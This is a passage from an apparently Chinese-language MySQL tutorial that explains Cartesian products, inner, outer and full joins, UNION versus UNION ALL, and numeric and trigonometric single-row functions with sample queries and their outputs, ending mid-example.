<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#查询员工姓名和所在部门名称</span><br><span class="line"><span class="keyword">SELECT</span> last_name,department_name <span class="keyword">FROM</span> employees,departments;</span><br><span class="line"><span class="keyword">SELECT</span> last_name,department_name <span class="keyword">FROM</span> employees <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> departments;</span><br><span class="line"><span class="keyword">SELECT</span> last_name,department_name <span class="keyword">FROM</span> employees <span class="keyword">INNER</span> <span class="keyword">JOIN</span> departments;</span><br><span class="line"><span class="keyword">SELECT</span> last_name,department_name <span class="keyword">FROM</span> employees <span class="keyword">JOIN</span> departments;</span><br></pre></td></tr></table></figure>

<h3 id="（2）笛卡尔积的分析与解决方法"><a href="#（2）笛卡尔积的分析与解决方法" class="headerlink" title="（2）笛卡尔积的分析与解决方法"></a>（2）笛卡尔积的分析与解决方法</h3><p><strong>笛卡尔积的错误会在下面条件下产生：</strong></p>
<ul>
<li>省略多个表的连接条件（或关联条件）</li>
<li>连接条件（或关联条件）无效</li>
<li>所有表中的所有行互相连接</li>
</ul>
<p><strong>为了避免笛卡尔积， 可以在 WHERE 加入有效的连接条件</strong></p>
<p><strong>加入连接条件后，查询语法：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table1.column, table2.column</span><br><span class="line"><span class="keyword">FROM</span> table1, table2</span><br><span class="line"><span class="keyword">WHERE</span> table1.column1 <span class="operator">=</span> table2.column2; #连接条件</span><br><span class="line"></span><br><span class="line"># 查询员工的姓名及其部门名称正确写法</span><br><span class="line"><span class="keyword">SELECT</span> last_name, department_name</span><br><span class="line"><span class="keyword">FROM</span> employees, departments</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id <span class="operator">=</span> departments.department_id;</span><br></pre></td></tr></table></figure>

<p><strong>在表中有相同列时，在列名之前加上表名前缀。</strong></p>
<h2 id="2-内连接"><a href="#2-内连接" class="headerlink" title="2. 内连接"></a>2. 内连接</h2><blockquote>
<p><strong>语法说明</strong>：</p>
<ul>
<li>可以使用 ON 子句指定额外的连接条件。</li>
<li>这个连接条件是与其它条件分开的。</li>
<li>ON 子句使语句具有更高的易读性。</li>
<li>关键字 JOIN、INNER JOIN、CROSS JOIN 的含义是一样的，都表示内连接</li>
</ul>
</blockquote>
<ul>
<li>语法</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表</span><br><span class="line"><span class="keyword">FROM</span> A表 <span class="keyword">INNER</span> <span class="keyword">JOIN</span> B表</span><br><span class="line"><span class="keyword">ON</span> 关联条件</span><br><span class="line"><span class="keyword">WHERE</span> 等其他子句;</span><br></pre></td></tr></table></figure>


<ul>
<li>使用JOIN…ON子句创建连接的语法结构：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table1.column, table2.column,table3.column</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1 和 table2 的连接条件</span><br><span class="line"><span class="keyword">JOIN</span> table3 <span class="keyword">ON</span> table2 和 table3 的连接条件</span><br></pre></td></tr></table></figure>

<p>它的嵌套逻辑类似我们使用的 FOR 循环：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> t1 <span class="keyword">in</span> table1:</span><br><span class="line">	<span class="keyword">for</span> t2 <span class="keyword">in</span> table2:</span><br><span class="line">		<span class="keyword">if</span> condition1:</span><br><span class="line">			<span class="keyword">for</span> t3 <span class="keyword">in</span> table3:</span><br><span class="line">				<span class="keyword">if</span> condition2:</span><br><span class="line">					output t1 + t2 + t3</span><br></pre></td></tr></table></figure>



<h2 id="3-外连接"><a href="#3-外连接" class="headerlink" title="3. 外连接"></a>3. 外连接</h2><h3 id="（1）左外连接-LEFT-OUTER-JOIN"><a href="#（1）左外连接-LEFT-OUTER-JOIN" class="headerlink" title="（1）左外连接(LEFT OUTER JOIN)"></a>（1）左外连接(LEFT OUTER JOIN)</h3><ul>
<li>语法</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#实现查询结果是A</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表</span><br><span class="line"><span class="keyword">FROM</span> A表 <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> B表</span><br><span class="line"><span class="keyword">ON</span> 关联条件</span><br><span class="line"><span class="keyword">WHERE</span> 等其他子句;</span><br></pre></td></tr></table></figure>

<ul>
<li>举例</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.last_name, e.department_id, d.department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> (e.department_id <span class="operator">=</span> d.department_id) ;</span><br></pre></td></tr></table></figure>

<h3 id="（2）右外连接-RIGHT-OUTER-JOIN"><a href="#（2）右外连接-RIGHT-OUTER-JOIN" class="headerlink" title="（2）右外连接(RIGHT OUTER JOIN)"></a>（2）右外连接(RIGHT OUTER JOIN)</h3><ul>
<li>语法</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#实现查询结果是B</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表</span><br><span class="line"><span class="keyword">FROM</span> A表 <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> B表</span><br><span class="line"><span class="keyword">ON</span> 关联条件</span><br><span class="line"><span class="keyword">WHERE</span> 等其他子句;</span><br></pre></td></tr></table></figure>

<ul>
<li>举例</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.last_name, e.department_id, d.department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e</span><br><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> (e.department_id <span class="operator">=</span> d.department_id) ;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>需要注意的是，LEFT JOIN 和 RIGHT JOIN 只存在于 SQL99 及以后的标准中，在 SQL92 中不存在，只能用 (+) 表示。</p>
</blockquote>
<h3 id="（3）满外连接-FULL-OUTER-JOIN"><a href="#（3）满外连接-FULL-OUTER-JOIN" class="headerlink" title="（3）满外连接(FULL OUTER JOIN)"></a>（3）满外连接(FULL OUTER JOIN)</h3><blockquote>
<ul>
<li>满外连接的结果 &#x3D; 左右表匹配的数据 + 左表没有匹配到的数据 + 右表没有匹配到的数据。</li>
<li>SQL99是支持满外连接的。使用FULL JOIN 或 FULL OUTER JOIN来实现。</li>
<li>需要注意的是，MySQL不支持FULL JOIN，但是可以用 LEFT JOIN UNION RIGHT join代替。</li>
</ul>
</blockquote>
<h2 id="4-UNION的使用"><a href="#4-UNION的使用" class="headerlink" title="4. UNION的使用"></a>4. UNION的使用</h2><p><strong>合并查询结果</strong><br>利用UNION关键字，可以给出多条SELECT语句，并将它们的结果组合成单个结果集。合并时，两个表对应的列数和数据类型必须相同，并且相互对应。各个SELECT语句之间使用<code>UNION</code>或<code>UNION ALL</code>关键字分隔。</p>
<p>语法格式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>,... <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span> [<span class="keyword">ALL</span>]</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>,... <span class="keyword">FROM</span> table2</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>UNION操作符</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135952.png" alt="  "></p>
<ul>
<li>UNION 操作符返回两个查询的结果集的并集，去除重复记录。</li>
</ul>
</blockquote>
<blockquote>
<p><strong>UNION ALL操作符</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135955.png" alt="  "></p>
<ul>
<li>UNION ALL操作符返回两个查询的结果集的并集。对于两个结果集的重复部分，不去重。</li>
</ul>
</blockquote>
<blockquote>
<p><strong>注意</strong>：执行UNION ALL语句时所需要的资源比UNION语句少。如果明确知道合并数据后的结果数据不存在重复数据，或者不需要去除重复的数据，则尽量使用UNION ALL语句，以提高数据查询的效率。</p>
</blockquote>
<p><strong>举例：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查询部门编号 <span class="operator">&gt;</span> <span class="number">90</span>或邮箱包含 a 的员工信息</span><br><span class="line"># 方式<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> email <span class="keyword">LIKE</span> <span class="string">&#x27;%a%&#x27;</span> <span class="keyword">OR</span> department_id<span class="operator">&gt;</span><span class="number">90</span>;</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> email <span class="keyword">LIKE</span> <span class="string">&#x27;%a%&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> department_id<span class="operator">&gt;</span><span class="number">90</span>;</span><br><span class="line"></span><br><span class="line"># 查询中国用户中男性的信息以及美国用户中年男性的用户信息</span><br><span class="line"><span class="keyword">SELECT</span> id,cname <span class="keyword">FROM</span> t_chinamale <span class="keyword">WHERE</span> csex<span class="operator">=</span><span class="string">&#x27;男&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> id,tname <span class="keyword">FROM</span> t_usmale <span class="keyword">WHERE</span> tGender<span class="operator">=</span><span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h2 id="5-7种SQL-JOINS的实现"><a href="#5-7种SQL-JOINS的实现" class="headerlink" title="5. 7种SQL JOINS的实现"></a>5. 7种SQL JOINS的实现</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135957.png" alt="  "></p>
<h3 id="（1）语法格式"><a href="#（1）语法格式" class="headerlink" title="（1）语法格式"></a>（1）语法格式</h3><ul>
<li>左中图</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 实现 A <span class="operator">-</span> A∩B</span><br><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> A表 <span class="keyword">left</span> <span class="keyword">join</span> B表</span><br><span class="line"><span class="keyword">on</span> 关联条件</span><br><span class="line"><span class="keyword">where</span> B表关联字段 <span class="keyword">is</span> <span class="keyword">null</span> <span class="keyword">and</span> 等其他子句;</span><br></pre></td></tr></table></figure>

<ul>
<li>右中图</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#实现 B <span class="operator">-</span> A∩B</span><br><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> A表 <span class="keyword">right</span> <span class="keyword">join</span> B表</span><br><span class="line"><span class="keyword">on</span> 关联条件</span><br><span class="line"><span class="keyword">where</span> A表关联字段 <span class="keyword">is</span> <span class="keyword">null</span> <span class="keyword">and</span> 等其他子句;</span><br></pre></td></tr></table></figure>

<ul>
<li>左下图</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 实现查询结果是 A∪B</span><br><span class="line"># 用左外的A，<span class="keyword">union</span> 右外的B</span><br><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> A表 <span class="keyword">left</span> <span class="keyword">join</span> B表</span><br><span class="line"><span class="keyword">on</span> 关联条件</span><br><span class="line"><span class="keyword">where</span> 等其他子句</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> A表 <span class="keyword">right</span> <span class="keyword">join</span> B表</span><br><span class="line"><span class="keyword">on</span> 关联条件</span><br><span class="line"><span class="keyword">where</span> 等其他子句;</span><br></pre></td></tr></table></figure>

<ul>
<li>右下图</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 实现 A∪B <span class="operator">-</span> A∩B 或 (A <span class="operator">-</span> A∩B) ∪ （B <span class="operator">-</span> A∩B）</span><br><span class="line"># 使用左外的 (A <span class="operator">-</span> A∩B) <span class="keyword">union</span> 右外的（B <span class="operator">-</span> A∩B）</span><br><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> A表 <span class="keyword">left</span> <span class="keyword">join</span> B表</span><br><span class="line"><span class="keyword">on</span> 关联条件</span><br><span class="line"><span class="keyword">where</span> B表关联字段 <span class="keyword">is</span> <span class="keyword">null</span> <span class="keyword">and</span> 等其他子句</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> 字段列表</span><br><span class="line"><span class="keyword">from</span> A表 <span class="keyword">right</span> <span class="keyword">join</span> B表</span><br><span class="line"><span class="keyword">on</span> 关联条件</span><br><span class="line"><span class="keyword">where</span> A表关联字段 <span class="keyword">is</span> <span class="keyword">null</span> <span class="keyword">and</span> 等其他子句</span><br></pre></td></tr></table></figure>

<h3 id="（2）代码实现"><a href="#（2）代码实现" class="headerlink" title="（2）代码实现"></a>（2）代码实现</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 中图：内连接</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id;</span><br><span class="line"></span><br><span class="line"># 左上图：左外连接</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id;</span><br><span class="line"></span><br><span class="line"># 右上图：右外连接</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id;</span><br><span class="line"></span><br><span class="line"># 左中图：</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line"><span class="keyword">WHERE</span> d.department_id <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"># 右中图：</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line"><span class="keyword">WHERE</span> e.department_id <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"># 左下图：满外连接</span><br><span class="line"># 方式<span class="number">1</span>：左上图 <span class="keyword">UNION</span> <span class="keyword">ALL</span> 右中图</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line"><span class="keyword">WHERE</span> e.department_id <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"># 方式<span class="number">2</span>：左中图 <span class="keyword">UNION</span> <span class="keyword">ALL</span> 右上图</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line"><span class="keyword">WHERE</span> d.department_id <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id;</span><br><span class="line"></span><br><span class="line"># 右下图：左中图  <span class="keyword">UNION</span> <span class="keyword">ALL</span> 右中图</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line"><span class="keyword">WHERE</span> d.department_id <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> employee_id,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id</span><br><span class="line"><span class="keyword">WHERE</span> e.department_id <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="七、单行函数"><a href="#七、单行函数" class="headerlink" title="七、单行函数"></a>七、单行函数</h1><p>MySQL提供了丰富的内置函数，这些函数使得数据的维护与管理更加方便，能够更好地提供数据的分析与统计功能，在一定程度上提高了开发人员进行数据分析与统计的效率。<br>MySQL提供的内置函数从 &#x3D;&#x3D;实现的功能角度&#x3D;&#x3D;可以分为数值函数、字符串函数、日期和时间函数、流程控制函数、加密与解密函数、获取MySQL信息函数、聚合函数等。这些丰富的内置函数可分为两类： 单行函数 、 聚合函数（或分组函数） 。</p>
<blockquote>
<p><strong>单行函数</strong></p>
<ul>
<li><p>操作数据对象</p>
</li>
<li><p>接受参数返回一个结果</p>
</li>
<li><p>只对一行进行变换</p>
</li>
<li><p>每行返回一个结果</p>
</li>
<li><p>可以嵌套</p>
</li>
<li><p>参数可以是一列或一个值</p>
</li>
</ul>
</blockquote>
<h2 id="1-数值函数"><a href="#1-数值函数" class="headerlink" title="1. 数值函数"></a>1. 数值函数</h2><h3 id="（1）基本函数"><a href="#（1）基本函数" class="headerlink" title="（1）基本函数"></a>（1）基本函数</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140002.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">ABS</span>(<span class="number">-123</span>),<span class="built_in">ABS</span>(<span class="number">32</span>),SIGN(<span class="number">-23</span>),SIGN(<span class="number">43</span>),PI(),<span class="built_in">CEIL</span>(<span class="number">32.32</span>),<span class="built_in">CEILING</span>(<span class="number">-43.23</span>),<span class="built_in">FLOOR</span>(<span class="number">32.32</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">FLOOR</span>(<span class="number">-43.23</span>),<span class="built_in">MOD</span>(<span class="number">12</span>,<span class="number">5</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------+-----------+----------+----------+-------------+-----------------+--------------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">ABS</span>(<span class="number">-123</span>) <span class="operator">|</span> <span class="built_in">ABS</span>(<span class="number">32</span>) <span class="operator">|</span> SIGN(<span class="number">-23</span>) <span class="operator">|</span> SIGN(<span class="number">43</span>) <span class="operator">|</span> PI()     <span class="operator">|</span> <span class="built_in">CEIL</span>(<span class="number">32.32</span>) <span class="operator">|</span> <span class="built_in">CEILING</span>(<span class="number">-43.23</span>) <span class="operator">|</span> <span class="built_in">FLOOR</span>(<span class="number">32.32</span>) <span class="operator">|</span> <span class="built_in">FLOOR</span>(<span class="number">-43.23</span>) <span class="operator">|</span> <span class="built_in">MOD</span>(<span class="number">12</span>,<span class="number">5</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------+-----------+----------+----------+-------------+-----------------+--------------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">123</span> <span class="operator">|</span>      <span class="number">32</span> <span class="operator">|</span>        <span class="number">-1</span> <span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span> <span class="number">3.141593</span> <span class="operator">|</span>          <span class="number">33</span> <span class="operator">|</span>             <span class="number">-43</span> <span class="operator">|</span>           <span class="number">32</span> <span class="operator">|</span>           <span class="number">-44</span> <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------+-----------+----------+----------+-------------+-----------------+--------------+---------------+-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> RAND(),RAND(),RAND(<span class="number">10</span>),RAND(<span class="number">10</span>),RAND(<span class="number">-1</span>),RAND(<span class="number">-1</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> RAND()             <span class="operator">|</span> RAND()             <span class="operator">|</span> RAND(<span class="number">10</span>)           <span class="operator">|</span> RAND(<span class="number">10</span>)           <span class="operator">|</span> RAND(<span class="number">-1</span>)           <span class="operator">|</span> RAND(<span class="number">-1</span>)           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.5148304584574238</span> <span class="operator">|</span> <span class="number">0.5509940325757433</span> <span class="operator">|</span> <span class="number">0.6570515219653505</span> <span class="operator">|</span> <span class="number">0.6570515219653505</span> <span class="operator">|</span> <span class="number">0.9050373219931845</span> <span class="operator">|</span> <span class="number">0.9050373219931845</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ROUND(<span class="number">12.33</span>),ROUND(<span class="number">12.343</span>,<span class="number">2</span>),ROUND(<span class="number">12.324</span>,<span class="number">-1</span>),<span class="keyword">TRUNCATE</span>(<span class="number">12.66</span>,<span class="number">1</span>),<span class="keyword">TRUNCATE</span>(<span class="number">12.66</span>,<span class="number">-1</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-----------------+------------------+-------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> ROUND(<span class="number">12.33</span>) <span class="operator">|</span> ROUND(<span class="number">12.343</span>,<span class="number">2</span>) <span class="operator">|</span> ROUND(<span class="number">12.324</span>,<span class="number">-1</span>) <span class="operator">|</span> <span class="keyword">TRUNCATE</span>(<span class="number">12.66</span>,<span class="number">1</span>) <span class="operator">|</span> <span class="keyword">TRUNCATE</span>(<span class="number">12.66</span>,<span class="number">-1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-----------------+------------------+-------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">12</span> <span class="operator">|</span>           <span class="number">12.34</span> <span class="operator">|</span>               <span class="number">10</span> <span class="operator">|</span>              <span class="number">12.6</span> <span class="operator">|</span>                 <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-----------------+------------------+-------------------+--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>




<h3 id="（2）角度与弧度互换函数"><a href="#（2）角度与弧度互换函数" class="headerlink" title="（2）角度与弧度互换函数"></a>（2）角度与弧度互换函数</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140005.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> RADIANS(<span class="number">30</span>),RADIANS(<span class="number">60</span>),RADIANS(<span class="number">90</span>),DEGREES(<span class="number">2</span><span class="operator">*</span>PI()),DEGREES(RADIANS(<span class="number">90</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+--------------------+-----------------+----------------------+</span></span><br><span class="line"><span class="operator">|</span> RADIANS(<span class="number">30</span>)        <span class="operator">|</span> RADIANS(<span class="number">60</span>)        <span class="operator">|</span> RADIANS(<span class="number">90</span>)        <span class="operator">|</span> DEGREES(<span class="number">2</span><span class="operator">*</span>PI()) <span class="operator">|</span> DEGREES(RADIANS(<span class="number">90</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+--------------------+-----------------+----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.5235987755982988</span> <span class="operator">|</span> <span class="number">1.0471975511965976</span> <span class="operator">|</span> <span class="number">1.5707963267948966</span> <span class="operator">|</span>             <span class="number">360</span> <span class="operator">|</span>                   <span class="number">90</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------+--------------------+-----------------+----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（3）三角函数"><a href="#（3）三角函数" class="headerlink" title="（3）三角函数"></a>（3）三角函数</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140007.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">SIN</span>(RADIANS(<span class="number">30</span>)),DEGREES(<span class="built_in">ASIN</span>(<span class="number">1</span>)),<span class="built_in">TAN</span>(RADIANS(<span class="number">45</span>)),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DEGREES(<span class="built_in">ATAN</span>(<span class="number">1</span>)),DEGREES(ATAN2(<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+------------------+--------------------+------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">SIN</span>(RADIANS(<span class="number">30</span>))    <span class="operator">|</span> DEGREES(<span class="built_in">ASIN</span>(<span class="number">1</span>)) <span class="operator">|</span> <span class="built_in">TAN</span>(RADIANS(<span class="number">45</span>))   <span class="operator">|</span> DEGREES(<span class="built_in">ATAN</span>(<span class="number">1</span>)) <span class="operator">|</span> DEGREES(ATAN2(<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+------------------+--------------------+------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.49999999999999994</span> <span class="operator">|</span>               <span class="number">90</span> <span class="operator">|</span> <span class="number">0.9999999999999999</span> <span class="operator">|</span>               <span class="number">45</span> <span class="operator">|</span>                  <span class="number">45</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+------------------+--------------------+------------------+---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> 